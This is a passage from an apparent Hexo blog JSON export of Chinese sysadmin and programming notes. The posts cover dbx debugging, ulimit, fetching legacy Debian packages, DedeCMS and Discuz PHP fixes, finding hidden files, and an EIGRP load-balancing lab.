in unnamed block in main at line 26<br />&nbsp;&nbsp; 26&nbsp;&nbsp; while (1){<br />(dbx) quit //pgm程序同时会结束运行，但可以先detach这个进程再退出。<br />4）查看运行中变量值，dump当前proc中的所有变量<br />(dbx) dump<br />main(), line 40 in &quot;pgm.c&quot;<br />pint = 0x2ff22ba0<br />pintvar = 5<br />pstring = &quot;&quot;<br />__func__ = &quot;main&quot;<br />(dbx)<br />如果需要查看某个内存地址值，命令：address/mode<br />例如pint指针地址（pint_addr: 804399856），二进制为：0x2ff22af0，<br />(dbx) 0x2ff22af0/D&nbsp;&nbsp; //按十进制打印一个长字<br />0x2ff22af0: 5</p><p>$man ulimit</p><p>ulimit Command</p><p>Purpose</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Sets or reports user resource limits.</p><p>Syntax</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ulimit [ -H ] [ -S ] [ -a ] [ -c ] [ -d ] [ -f ] [ -m ] [ -n ] [ -r ] [ -s ] [ -t ] [-u ][ Limit ]</p><p>Description</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; The ulimit command sets or reports user process resource limits, as defined in the /etc/security/limits file. This file<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; contains these default limits:</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; fsize = 2097151<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; core = 2097151<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cpu = -1<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; data = 262144<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; rss = 65536<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; stack = 65536<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; nofiles = 2000<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; threads = -1<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; nproc = -1</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; These values are used as default settings when a new user is added to the system. The values are set with the mkuser<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; command when the user is added to the system, or changed with the chuser command.</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Limits are categorized as either soft or hard. With the ulimit command, you can change your soft limits, up to the maximum<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; set by the hard limits. You must have root user authority to change resource hard limits.</p><p>test $ ulimit -c<br />0<br />test $ ulimit -c 1000<br />test $ ulimit -c<br />1000</p><p>#&amp;g_test/16x 显示从 g_test 的地址开始处，连续 16 个 WORD（?byte）的取值</p><p>列举寄存器内容：</p><p>(dbx) registers</p><p>&nbsp;<img src=\"/images/pic/4afe5e81d158ccbf4465478a19d8bc3eb035414d.jpg\" small=\"0\" /><br /></p><p>显示寄存器中变量值，例如显示$r0的值&nbsp;</p><p>(dbx)p $r0</p><p>0x100001bc </p>"},{"title":"debian termcap-compat","date":"2011-07-14T14:36:00.000Z","_content":"<p><strong>可怜，debian源里面居然没有。</strong></p><p><strong><br /></strong></p><p><strong>wget http://geco.phys.columbia.edu/~rubab/iraf/termcap-compat_1.2.3_i386.deb</strong></p><p><strong>wget http://geco.phys.columbia.edu/~rubab/iraf/libc5_5.4.46-15_i386.deb</strong></p><strong>wget http://geco.phys.columbia.edu/~rubab/iraf/ldso_1.9.11-15_i386.deb</strong><p></p>","source":"_posts/debian-termcap-compat.md","raw":"title: debian termcap-compat\ncategories: [Linux]\ntags: []\ndate: 2011-07-14 22:36:00\n---\n<p><strong>可怜，debian源里面居然没有。</strong></p><p><strong><br /></strong></p><p><strong>wget http://geco.phys.columbia.edu/~rubab/iraf/termcap-compat_1.2.3_i386.deb</strong></p><p><strong>wget http://geco.phys.columbia.edu/~rubab/iraf/libc5_5.4.46-15_i386.deb</strong></p><strong>wget http://geco.phys.columbia.edu/~rubab/iraf/ldso_1.9.11-15_i386.deb</strong><p></p>","slug":"debian-termcap-compat","published":1,"updated":"2023-04-22T05:38:44.747Z","_id":"clgrjlxc300177opifg9qg4kf","comments":1,"layout":"post","photos":[],"link":"","content":"<p><strong>可怜，debian源里面居然没有。</strong></p><p><strong><br /></strong></p><p><strong>wget http://geco.phys.columbia.edu/~rubab/iraf/termcap-compat_1.2.3_i386.deb</strong></p><p><strong>wget http://geco.phys.columbia.edu/~rubab/iraf/libc5_5.4.46-15_i386.deb</strong></p><strong>wget http://geco.phys.columbia.edu/~rubab/iraf/ldso_1.9.11-15_i386.deb</strong><p></p>","site":{"data":{}},"excerpt":"","more":"<p><strong>可怜，debian源里面居然没有。</strong></p><p><strong><br /></strong></p><p><strong>wget http://geco.phys.columbia.edu/~rubab/iraf/termcap-compat_1.2.3_i386.deb</strong></p><p><strong>wget http://geco.phys.columbia.edu/~rubab/iraf/libc5_5.4.46-15_i386.deb</strong></p><strong>wget http://geco.phys.columbia.edu/~rubab/iraf/ldso_1.9.11-15_i386.deb</strong><p></p>"},{"title":"Dedecms GBK版本后台系统设置无法输入中文问题","date":"2015-06-13T14:20:24.000Z","_content":"最近用dedecms搭建了一个简单的站，主要用于测试。发现在后台系统-系统基础参数。很多选项没有办法成功设置中文。\n实际上提交已成功，看数据库dede_sysconfig记录已成功插入，应该属于显示问题。看显示代码\n<pre>\ndede/templets/sys_info.htm:\n\techo \"<input type='text' name='edit___{$row['varname']}' id='edit___{$row['varname']}' value=\"\".htmlspecialchars($row['value']).\"\" style='width:80%'>{$addstr}\";\n</pre>\n用于转换html特殊字符，网上查询了一下，是PHP5.4以上版本会有这个问题，必须指定编号类型。需修改为\n<pre>\n\techo \"<input type='text' name='edit___{$row['varname']}' id='edit___{$row['varname']}' value=\"\".htmlspecialchars($row['value'],ENT_COMPAT,'GB2312').\"\" style='width:80%'>{$addstr}\";\n</pre>\n修改后，再修改系统基础参数就可以显示了。\n因为代码中太多类似的代码了，最好还是降低一下php的版本。","source":"_posts/Dedecms-GBK版本后台系统设置无法输入中文问题.md","raw":"title: Dedecms GBK版本后台系统设置无法输入中文问题\ncategories: [程序设计,Php编程]\ntags: []\ndate: 2015-06-13 22:20:24\n---\n最近用dedecms搭建了一个简单的站，主要用于测试。发现在后台系统-系统基础参数。很多选项没有办法成功设置中文。\n实际上提交已成功，看数据库dede_sysconfig记录已成功插入，应该属于显示问题。看显示代码\n<pre>\ndede/templets/sys_info.htm:\n\techo \"<input type='text' name='edit___{$row['varname']}' id='edit___{$row['varname']}' value=\"\".htmlspecialchars($row['value']).\"\" style='width:80%'>{$addstr}\";\n</pre>\n用于转换html特殊字符，网上查询了一下，是PHP5.4以上版本会有这个问题，必须指定编号类型。需修改为\n<pre>\n\techo \"<input type='text' name='edit___{$row['varname']}' id='edit___{$row['varname']}' value=\"\".htmlspecialchars($row['value'],ENT_COMPAT,'GB2312').\"\" style='width:80%'>{$addstr}\";\n</pre>\n修改后，再修改系统基础参数就可以显示了。\n因为代码中太多类似的代码了，最好还是降低一下php的版本。","slug":"Dedecms-GBK版本后台系统设置无法输入中文问题","published":1,"updated":"2023-04-22T05:38:44.630Z","_id":"clgrjlxc5001a7opi4uyg4q8q","comments":1,"layout":"post","photos":[],"link":"","content":"<p>最近用dedecms搭建了一个简单的站，主要用于测试。发现在后台系统-系统基础参数。很多选项没有办法成功设置中文。<br>实际上提交已成功，看数据库dede_sysconfig记录已成功插入，应该属于显示问题。看显示代码</p>\n<pre>\ndede/templets/sys_info.htm:\n    echo \"<input type='text' name='edit___{$row['varname']}' id='edit___{$row['varname']}' value=\"\".htmlspecialchars($row['value']).\"\" style='width:80%'>{$addstr}\";\n</pre>\n<p>用于转换html特殊字符，网上查询了一下，是PHP5.4以上版本会有这个问题，必须指定编号类型。需修改为</p>\n<pre>\n    echo \"<input type='text' name='edit___{$row['varname']}' id='edit___{$row['varname']}' value=\"\".htmlspecialchars($row['value'],ENT_COMPAT,'GB2312').\"\" style='width:80%'>{$addstr}\";\n</pre>\n<p>修改后，再修改系统基础参数就可以显示了。<br>因为代码中太多类似的代码了，最好还是降低一下php的版本。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>最近用dedecms搭建了一个简单的站，主要用于测试。发现在后台系统-系统基础参数。很多选项没有办法成功设置中文。<br>实际上提交已成功，看数据库dede_sysconfig记录已成功插入，应该属于显示问题。看显示代码</p>\n<pre>\ndede/templets/sys_info.htm:\n    echo \"<input type='text' name='edit___{$row['varname']}' id='edit___{$row['varname']}' value=\"\".htmlspecialchars($row['value']).\"\" style='width:80%'>{$addstr}\";\n</pre>\n<p>用于转换html特殊字符，网上查询了一下，是PHP5.4以上版本会有这个问题，必须指定编号类型。需修改为</p>\n<pre>\n    echo \"<input type='text' name='edit___{$row['varname']}' id='edit___{$row['varname']}' value=\"\".htmlspecialchars($row['value'],ENT_COMPAT,'GB2312').\"\" style='width:80%'>{$addstr}\";\n</pre>\n<p>修改后，再修改系统基础参数就可以显示了。<br>因为代码中太多类似的代码了，最好还是降低一下php的版本。</p>\n"},{"title":"dedecms 嵌套dsql","date":"2016-02-13T05:15:08.000Z","_content":"织梦CMS中嵌套查询语句,SetQuery和GetObject传入不同的参数就可以了。\n<pre>\nif($keyword != '')\n{\n\t$query2 = \"SELECT id,title,typeid FROM `#@__archives` where arcrank>-1 AND ($keyword) ORDER BY id desc limit 0,5\";\n}\nelse\n{\n\t$query2 = \"SELECT id,title,typeid FROM `#@__archives` where arcrank>-1 ORDER BY id desc limit 0,5\";\n}\n$dsql->SetQuery($query2);\n$dsql->Execute(1);\nwhile($row=$dsql->GetObject(1))\n{\n\t$dsql->SetQuery(\"Select typedir From `#@__arctype` where id='$row->typeid'\");\n\t$dsql->Execute(2);\n\t$ttrow=$dsql->GetObject(2);\n\t$tpdir=substr($ttrow->typedir,10);\n\t$likearticle .= \"<li><a href='/m/article/{$tpdir}/{$row->id}.html'>\".cut_str(ConvertStr($row->title),16).\"</a></li>\";\n}\n</pre>","source":"_posts/dedecms-嵌套dsql.md","raw":"title: dedecms 嵌套dsql\ncategories: [程序设计,Php编程]\ntags: []\ndate: 2016-02-13 13:15:08\n---\n织梦CMS中嵌套查询语句,SetQuery和GetObject传入不同的参数就可以了。\n<pre>\nif($keyword != '')\n{\n\t$query2 = \"SELECT id,title,typeid FROM `#@__archives` where arcrank>-1 AND ($keyword) ORDER BY id desc limit 0,5\";\n}\nelse\n{\n\t$query2 = \"SELECT id,title,typeid FROM `#@__archives` where arcrank>-1 ORDER BY id desc limit 0,5\";\n}\n$dsql->SetQuery($query2);\n$dsql->Execute(1);\nwhile($row=$dsql->GetObject(1))\n{\n\t$dsql->SetQuery(\"Select typedir From `#@__arctype` where id='$row->typeid'\");\n\t$dsql->Execute(2);\n\t$ttrow=$dsql->GetObject(2);\n\t$tpdir=substr($ttrow->typedir,10);\n\t$likearticle .= \"<li><a href='/m/article/{$tpdir}/{$row->id}.html'>\".cut_str(ConvertStr($row->title),16).\"</a></li>\";\n}\n</pre>","slug":"dedecms-嵌套dsql","published":1,"updated":"2023-04-22T05:38:44.749Z","_id":"clgrjlxd0001o7opi83302bte","comments":1,"layout":"post","photos":[],"link":"","content":"<p>织梦CMS中嵌套查询语句,SetQuery和GetObject传入不同的参数就可以了。</p>\n<pre>\nif($keyword != '')\n{\n    $query2 = \"SELECT id,title,typeid FROM `#@__archives` where arcrank>-1 AND ($keyword) ORDER BY id desc limit 0,5\";\n}\nelse\n{\n    $query2 = \"SELECT id,title,typeid FROM `#@__archives` where arcrank>-1 ORDER BY id desc limit 0,5\";\n}\n$dsql->SetQuery($query2);\n$dsql->Execute(1);\nwhile($row=$dsql->GetObject(1))\n{\n    $dsql->SetQuery(\"Select typedir From `#@__arctype` where id='$row->typeid'\");\n    $dsql->Execute(2);\n    $ttrow=$dsql->GetObject(2);\n    $tpdir=substr($ttrow->typedir,10);\n    $likearticle .= \"<li><a href='/m/article/{$tpdir}/{$row->id}.html'>\".cut_str(ConvertStr($row->title),16).\"</a></li>\";\n}\n</pre>","site":{"data":{}},"excerpt":"","more":"<p>织梦CMS中嵌套查询语句,SetQuery和GetObject传入不同的参数就可以了。</p>\n<pre>\nif($keyword != '')\n{\n    $query2 = \"SELECT id,title,typeid FROM `#@__archives` where arcrank>-1 AND ($keyword) ORDER BY id desc limit 0,5\";\n}\nelse\n{\n    $query2 = \"SELECT id,title,typeid FROM `#@__archives` where arcrank>-1 ORDER BY id desc limit 0,5\";\n}\n$dsql->SetQuery($query2);\n$dsql->Execute(1);\nwhile($row=$dsql->GetObject(1))\n{\n    $dsql->SetQuery(\"Select typedir From `#@__arctype` where id='$row->typeid'\");\n    $dsql->Execute(2);\n    $ttrow=$dsql->GetObject(2);\n    $tpdir=substr($ttrow->typedir,10);\n    $likearticle .= \"<li><a href='/m/article/{$tpdir}/{$row->id}.html'>\".cut_str(ConvertStr($row->title),16).\"</a></li>\";\n}\n</pre>"},{"title":"dizcuz 不能加载模板问题","date":"2015-10-18T12:10:56.000Z","_content":"今天帮朋友迁移一个教育网站，在目标主机上面搭建好LNMP后，把网站打包上传，数据库备份上传，把数据库导入，网站文件和目录设置好，还有一些乱七八糟的设置设置。配置弄好后，启动程序，测试一下网站是否和原来的功能是否一致，页面是否都正常，需要和没迁移前保持一样。经过测试，其他的几个模块都没有问题，有一个BBS的模块，使用的dizcuz的程序，版本有些老了，打开首页直接显示模板内容了。看了对应的php是可以解析的，php解析没有问题，再看权限，设置的也合理。最后看了看解析的代码页没有问题，网站的文件都是打包过来的，文件一致性肯定能保证，肯定是环境哪里设置的问题。最好找了半天发现一个php的参数没有修改,原来是short_open_tag = Off，修改为On，重启一下php-fpm，（如果你是apache+php模块，就重启apache），再次访问就正常了。关于这个参数区别如下：\n<pre>\nphp.ini\n; This directive determines whether or not PHP will recognize code between\n; <? and ?> tags as PHP source which should be processed as such. It's been\n; recommended for several years that you not use the short tag \"short cut\" and\n; instead to use the full <?php and ?> tag combination. With the wide spread use\n; of XML and use of these tags by other languages, the server can become easily\n; confused and end up parsing the wrong code in the wrong context. But because\n; this short cut has been a feature for such a long time, it's currently still\n; supported for backwards compatibility, but we recommend you don't use them.\n; Default Value: On\n; Development Value: Off\n; Production Value: Off\n; http://php.net/short-open-tag\nshort_open_tag = On\n</pre>\n这种情况也只有迁移的时候会遇到，如果重新安装，discuz检查php参数的时候肯定是报错不通过的。","source":"_posts/dizcuz-不能加载模板问题.md","raw":"title: dizcuz 不能加载模板问题\ncategories: [Php编程]\ntags: []\ndate: 2015-10-18 20:10:56\n---\n今天帮朋友迁移一个教育网站，在目标主机上面搭建好LNMP后，把网站打包上传，数据库备份上传，把数据库导入，网站文件和目录设置好，还有一些乱七八糟的设置设置。配置弄好后，启动程序，测试一下网站是否和原来的功能是否一致，页面是否都正常，需要和没迁移前保持一样。经过测试，其他的几个模块都没有问题，有一个BBS的模块，使用的dizcuz的程序，版本有些老了，打开首页直接显示模板内容了。看了对应的php是可以解析的，php解析没有问题，再看权限，设置的也合理。最后看了看解析的代码页没有问题，网站的文件都是打包过来的，文件一致性肯定能保证，肯定是环境哪里设置的问题。最好找了半天发现一个php的参数没有修改,原来是short_open_tag = Off，修改为On，重启一下php-fpm，（如果你是apache+php模块，就重启apache），再次访问就正常了。关于这个参数区别如下：\n<pre>\nphp.ini\n; This directive determines whether or not PHP will recognize code between\n; <? and ?> tags as PHP source which should be processed as such. It's been\n; recommended for several years that you not use the short tag \"short cut\" and\n; instead to use the full <?php and ?> tag combination. With the wide spread use\n; of XML and use of these tags by other languages, the server can become easily\n; confused and end up parsing the wrong code in the wrong context. But because\n; this short cut has been a feature for such a long time, it's currently still\n; supported for backwards compatibility, but we recommend you don't use them.\n; Default Value: On\n; Development Value: Off\n; Production Value: Off\n; http://php.net/short-open-tag\nshort_open_tag = On\n</pre>\n这种情况也只有迁移的时候会遇到，如果重新安装，discuz检查php参数的时候肯定是报错不通过的。","slug":"dizcuz-不能加载模板问题","published":1,"updated":"2023-04-22T05:38:44.752Z","_id":"clgrjlxd3001p7opibpnq2asa","comments":1,"layout":"post","photos":[],"link":"","content":"<p>今天帮朋友迁移一个教育网站，在目标主机上面搭建好LNMP后，把网站打包上传，数据库备份上传，把数据库导入，网站文件和目录设置好，还有一些乱七八糟的设置设置。配置弄好后，启动程序，测试一下网站是否和原来的功能是否一致，页面是否都正常，需要和没迁移前保持一样。经过测试，其他的几个模块都没有问题，有一个BBS的模块，使用的dizcuz的程序，版本有些老了，打开首页直接显示模板内容了。看了对应的php是可以解析的，php解析没有问题，再看权限，设置的也合理。最后看了看解析的代码页没有问题，网站的文件都是打包过来的，文件一致性肯定能保证，肯定是环境哪里设置的问题。最好找了半天发现一个php的参数没有修改,原来是short_open_tag &#x3D; Off，修改为On，重启一下php-fpm，（如果你是apache+php模块，就重启apache），再次访问就正常了。关于这个参数区别如下：</p>\n<pre>\nphp.ini\n; This directive determines whether or not PHP will recognize code between\n; <? and ?> tags as PHP source which should be processed as such. It's been\n; recommended for several years that you not use the short tag \"short cut\" and\n; instead to use the full <?php and ?> tag combination. With the wide spread use\n; of XML and use of these tags by other languages, the server can become easily\n; confused and end up parsing the wrong code in the wrong context. But because\n; this short cut has been a feature for such a long time, it's currently still\n; supported for backwards compatibility, but we recommend you don't use them.\n; Default Value: On\n; Development Value: Off\n; Production Value: Off\n; http://php.net/short-open-tag\nshort_open_tag = On\n</pre>\n<p>这种情况也只有迁移的时候会遇到，如果重新安装，discuz检查php参数的时候肯定是报错不通过的。</p>\n","site":{"data":{}},"excerpt":"","more":"<p>今天帮朋友迁移一个教育网站，在目标主机上面搭建好LNMP后，把网站打包上传，数据库备份上传，把数据库导入，网站文件和目录设置好，还有一些乱七八糟的设置设置。配置弄好后，启动程序，测试一下网站是否和原来的功能是否一致，页面是否都正常，需要和没迁移前保持一样。经过测试，其他的几个模块都没有问题，有一个BBS的模块，使用的dizcuz的程序，版本有些老了，打开首页直接显示模板内容了。看了对应的php是可以解析的，php解析没有问题，再看权限，设置的也合理。最后看了看解析的代码页没有问题，网站的文件都是打包过来的，文件一致性肯定能保证，肯定是环境哪里设置的问题。最好找了半天发现一个php的参数没有修改,原来是short_open_tag &#x3D; Off，修改为On，重启一下php-fpm，（如果你是apache+php模块，就重启apache），再次访问就正常了。关于这个参数区别如下：</p>\n<pre>\nphp.ini\n; This directive determines whether or not PHP will recognize code between\n; <? and ?> tags as PHP source which should be processed as such. It's been\n; recommended for several years that you not use the short tag \"short cut\" and\n; instead to use the full <?php and ?> tag combination. With the wide spread use\n; of XML and use of these tags by other languages, the server can become easily\n; confused and end up parsing the wrong code in the wrong context. But because\n; this short cut has been a feature for such a long time, it's currently still\n; supported for backwards compatibility, but we recommend you don't use them.\n; Default Value: On\n; Development Value: Off\n; Production Value: Off\n; http://php.net/short-open-tag\nshort_open_tag = On\n</pre>\n<p>这种情况也只有迁移的时候会遇到，如果重新安装，discuz检查php参数的时候肯定是报错不通过的。</p>\n"},{"title":"find 查到隐藏文件","date":"2011-07-01T09:05:00.000Z","_content":"<p>查找一个目录下的一个目录下的隐藏文件</p><p>find PATH -name &quot;.*&quot; -type f </p><p>name 匹配要用双引号&quot; &quot;.</p><p>&nbsp;</p><p>可以查看 被rootkit 或web页面所应藏的webshell和back door。</p>","source":"_posts/find-查到隐藏文件.md","raw":"title: find 查到隐藏文件\ncategories: [Linux]\ntags: []\ndate: 2011-07-01 17:05:00\n---\n<p>查找一个目录下的一个目录下的隐藏文件</p><p>find PATH -name &quot;.*&quot; -type f </p><p>name 匹配要用双引号&quot; &quot;.</p><p>&nbsp;</p><p>可以查看 被rootkit 或web页面所应藏的webshell和back door。</p>","slug":"find-查到隐藏文件","published":1,"updated":"2023-04-22T05:38:44.756Z","_id":"clgrjlxd4001q7opi2v8u7urr","comments":1,"layout":"post","photos":[],"link":"","content":"<p>查找一个目录下的一个目录下的隐藏文件</p><p>find PATH -name &quot;.*&quot; -type f </p><p>name 匹配要用双引号&quot; &quot;.</p><p>&nbsp;</p><p>可以查看 被rootkit 或web页面所应藏的webshell和back door。</p>","site":{"data":{}},"excerpt":"","more":"<p>查找一个目录下的一个目录下的隐藏文件</p><p>find PATH -name &quot;.*&quot; -type f </p><p>name 匹配要用双引号&quot; &quot;.</p><p>&nbsp;</p><p>可以查看 被rootkit 或web页面所应藏的webshell和back door。</p>"},{"title":"ERGRP等价负载均衡+度量值计算","date":"2010-03-29T11:58:00.000Z","_content":"试验拓扑：\n<img src=\"/images/pic/c42f172187e85a924723e872.jpg\" alt=\"\" />\n如图用eigrp配置全网络，通。\n该网络本身就是非等价负载网络。\n查看个路由器状态\nR1#sh ip route\nC    192.168.1.0/24 is directly connected, FastEthernet0/1\nC    192.168.2.0/24 is directly connected, FastEthernet0/0\nD    192.168.3.0/24 [90/284160] via 192.168.1.2, 00:16:03, FastEthernet0/1\nR1#R1#sh ip ei topology\nIP-EIGRP Topology Table for AS(1)/ID(1.1.1.1)\nCodes: P - Passive, A - Active, U - Update, Q - Query, R - Reply,\nr - Reply status\nP 192.168.1.0/24, 1 successors, FD is 28160\nvia Connected, FastEthernet0/1\nP 192.168.2.0/24, 1 successors, FD is 281600\nvia Connected, FastEthernet0/0\nP 192.168.3.0/24, 1 successors, FD is 284160\nvia 192.168.1.2 (284160/281600), FastEthernet0/1\nvia 192.168.2.2 (537600/281600), FastEthernet0/0\nR2#sh ip route\nC    192.168.1.0/24 is directly connected, Ethernet1/0\nD    192.168.2.0/24 [90/307200] via 192.168.3.1, 00:17:19, Ethernet1/2\nC    192.168.3.0/24 is directly connected, Ethernet1/2\nR2#\nR2#sh ip ei to\nIP-EIGRP Topology Table for AS(1)/ID(2.2.2.2)\nCodes: P - Passive, A - Active, U - Update, Q - Query, R - Reply,\nr - Reply status\nP 192.168.1.0/24, 1 successors, FD is 281600\nvia Connected, Ethernet1/0\nP 192.168.2.0/24, 1 successors, FD is 284160\nvia 192.168.3.1 (307200/281600), Ethernet1/2\nvia 192.168.1.1 (537600/281600), Ethernet1/0, serno 31\nP 192.168.3.0/24, 1 successors, FD is 281600\nvia Connected, Ethernet1/2\nR3#sh ip route\nD    192.168.1.0/24 [90/284160] via 192.168.2.1, 00:18:01, Ethernet1/0\nC    192.168.2.0/24 is directly connected, Ethernet1/0\nC    192.168.3.0/24 is directly connected, Ethernet1/1\nR3#sh ip eigrp topology\nIP-EIGRP Topology Table for AS(1)/ID(192.168.3.1)\nCodes: P - Passive, A - Active, U - Update, Q - Query, R - Reply,\nr - Reply status\nP 192.168.1.0/24, 1 successors, FD is 284160\nvia 192.168.2.1 (284160/28160), Ethernet1/0\nvia 192.168.3.2 (307200/281600), Ethernet1/1\nP 192.168.2.0/24, 1 successors, FD is 281600\nvia Connected, Ethernet1/0\nP 192.168.3.0/24, 1 successors, FD is 281600\nvia Connected, Ethernet1/1\n就拿R3的topology来说\nP 192.168.1.0/24, 1 successors, FD is 284160\nvia 192.168.2.1 (284160/28160), Ethernet1/0\nvia 192.168.3.2 (307200/281600), Ethernet1/1\n根据度量值公式来算，本博客有，上一遍就是。\n求入口带宽最小的，就是R3学到192.168.1.0的更新入端口。第一条线：R1的F0/1和R3的E1/0。第二条线：R1的E1/0和R3的E1/1。\n我们来计算一下\n首先查去以上端口的BW和延迟，只取重要的啦。\n第一条线路\nR1#sh inter f0/1\nFastEthernet0/1 is up, line protocol is up\nHardware is AmdFE, address is c800.0d2c.0001 (bia c800.0d2c.0001)\nInternet address is 192.168.1.1/24\nMTU 1500 bytes, BW 100000 Kbit, DLY 100 usec,\nreliability 255/255, txload 1/255, rxload 1/255\nEncapsulation ARPA, loopback not set\nKeepalive set (10 sec)\nHalf-duplex, 100Mb/s, 100BaseTX/FX\nR3#sh inter e1/0\nEthernet1/0 is up, line protocol is up\nHardware is AmdP2, address is c804.0d2c.0010 (bia c804.0d2c.0010)\nInternet address is 192.168.2.2/24\nMTU 1500 bytes, BW 10000 Kbit, DLY 1000 usec,\nreliability 255/255, txload 1/255, rxload 1/255\nEncapsulation ARPA, loopback not set\nKeepalive set (10 sec)\nARP type: ARPA, ARP Timeout 04:00:00\n[10^7/10000+(1000+100)/10]*256=284160\n第二条线路\nR2#sh inter e1/0\nEthernet1/0 is up, line protocol is up\nHardware is AmdP2, address is c801.0d2c.0010 (bia c801.0d2c.0010)\nInternet address is 192.168.1.2/24\nMTU 1500 bytes, BW 10000 Kbit, DLY 1000 usec,\nreliability 255/255, txload 1/255, rxload 1/255\nEncapsulation ARPA, loopback not set\nKeepalive set (10 sec)\nARP type: ARPA, ARP Timeout 04:00:00\nR3#sh inter e1/1\nEthernet1/1 is up, line protocol is up\nHardware is AmdP2, address is c804.0d2c.0011 (bia c804.0d2c.0011)\nInternet address is 192.168.3.1/24\nMTU 1500 bytes, BW 10000 Kbit, DLY 1000 usec,\nreliability 255/255, txload 1/255, rxload 1/255\nEncapsulation ARPA, loopback not set\nKeepalive set (10 sec)\nARP type: ARPA, ARP Timeout 04:00:00\n[10^7/10000+(1000+1000)/10]*256=307200\n只要要两个度量值相同，就可以形成等价负载均衡。\n进入R1 接口F0/1中把延迟改为1000就可以了。\nR1(config-if)#delay 100\n（注意DLY的单位是usec，在配置时，改成delay 100就可以，查看就变成1000usec了，单位问题）\n在不同的环境中，也可以改带宽，设置的带宽并不是物理的，bandwidth 命令只会修改 EIGRP 和 OSPF 等路由协议所用的带宽度量。今天才知道，很郁闷。\n来看下路由表吧。\nR3#sh ip route\nD    192.168.1.0/24 [90/307200] via 192.168.3.2, 00:07:51, Ethernet1/1\n[90/307200] via 192.168.2.1, 00:07:51, Ethernet1/0\nC    192.168.2.0/24 is directly connected, Ethernet1/0\nC    192.168.3.0/24 is directly connected, Ethernet1/1\n&nbsp;","source":"_posts/ERGRP等价负载均衡+度量值计算.md","raw":"title: ERGRP等价负载均衡+度量值计算\ncategories: [网络工程]\ntags: []\ndate: 2010-03-29 19:58:00\n---\n试验拓扑：\n<img src=\"/images/pic/c42f172187e85a924723e872.jpg\" alt=\"\" />\n如图用eigrp配置全网络，通。\n该网络本身就是非等价负载网络。\n查看个路由器状态\nR1#sh ip route\nC    192.168.1.0/24 is directly connected, FastEthernet0/1\nC    192.168.2.0/24 is directly connected, FastEthernet0/0\nD    192.168.3.0/24 [90/284160] via 192.168.1.2, 00:16:03, FastEthernet0/1\nR1#R1#sh ip ei topology\nIP-EIGRP Topology Table for AS(1)/ID(1.1.1.1)\nCodes: P - Passive, A - Active, U - Update, Q - Query, R - Reply,\nr - Reply status\nP 192.168.1.0/24, 1 successors, FD is 28160\nvia Connected, FastEthernet0/1\nP 192.168.2.0/24, 1 successors, FD is 281600\nvia Connected, FastEthernet0/0\nP 192.168.3.0/24, 1 successors, FD is 284160\nvia 192.168.1.2 (284160/281600), FastEthernet0/1\nvia 192.168.2.2 (537600/281600), FastEthernet0/0\nR2#sh ip route\nC    192.168.1.0/24 is directly connected, Ethernet1/0\nD    192.168.2.0/24 [90/307200] via 192.168.3.1, 00:17:19, Ethernet1/2\nC    192.168.3.0/24 is directly connected, Ethernet1/2\nR2#\nR2#sh ip ei to\nIP-EIGRP Topology Table for AS(1)/ID(2.2.2.2)\nCodes: P - Passive, A - Active, U - Update, Q - Query, R - Reply,\nr - Reply status\nP 192.168.1.0/24, 1 successors, FD is 281600\nvia Connected, Ethernet1/0\nP 192.168.2.0/24, 1 successors, FD is 284160\nvia 192.168.3.1 (307200/281600), Ethernet1/2\nvia 192.168.1.1 (537600/281600), Ethernet1/0, serno 31\nP 192.168.3.0/24, 1 successors, FD is 281600\nvia Connected, Ethernet1/2\nR3#sh ip route\nD    192.168.1.0/24 [90/284160] via 192.168.2.1, 00:18:01, Ethernet1/0\nC    192.168.2.0/24 is directly connected, Ethernet1/0\nC    192.168.3.0/24 is directly connected, Ethernet1/1\nR3#sh ip eigrp topology\nIP-EIGRP Topology Table for AS(1)/ID(192.168.3.1)\nCodes: P - Passive, A - Active, U - Update, Q - Query, R - Reply,\nr - Reply status\nP 192.168.1.0/24, 1 successors, FD is 284160\nvia 192.168.2.1 (284160/28160), Ethernet1/0\nvia 192.168.3.2 (307200/281600), Ethernet1/1\nP 192.168.2.0/24, 1 successors, FD is 281600\nvia Connected, Ethernet1/0\nP 192.168.3.0/24, 1 successors, FD is 281600\nvia Connected, Ethernet1/1\n就拿R3的topology来说\nP 192.168.1.0/24, 1 successors, FD is 284160\nvia 192.168.2.1 (284160/28160), Ethernet1/0\nvia 192.168.3.2 (307200/281600), Ethernet1/1\n根据度量值公式来算，本博客有，上一遍就是。\n求入口带宽最小的，就是R3学到192.168.1.0的更新入端口。第一条线：R1的F0/1和R3的E1/0。第二条线：R1的E1/0和R3的E1/1。\n我们来计算一下\n首先查去以上端口的BW和延迟，只取重要的啦。\n第一条线路\nR1#sh inter f0/1\nFastEthernet0/1 is up, line protocol is up\nHardware is AmdFE, address is c800.0d2c.0001 (bia c800.0d2c.0001)\nInternet address is 192.168.1.1/24\nMTU 1500 bytes, BW 100000 Kbit, DLY 100 usec,\nreliability 255/255, txload 1/255, rxload 1/255\nEncapsulation ARPA, loopback not set\nKeepalive set (10 sec)\nHalf-duplex, 100Mb/s, 100BaseTX/FX\nR3#sh inter e1/0\nEthernet1/0 is up, line protocol is up\nHardware is AmdP2, address is c804.0d2c.0010 (bia c804.0d2c.0010)\nInternet address is 192.168.2.2/24\nMTU 1500 bytes, BW 10000 Kbit, DLY 1000 usec,\nreliability 255/255, txload 1/255, rxload 1/255\nEncapsulation ARPA, loopback not 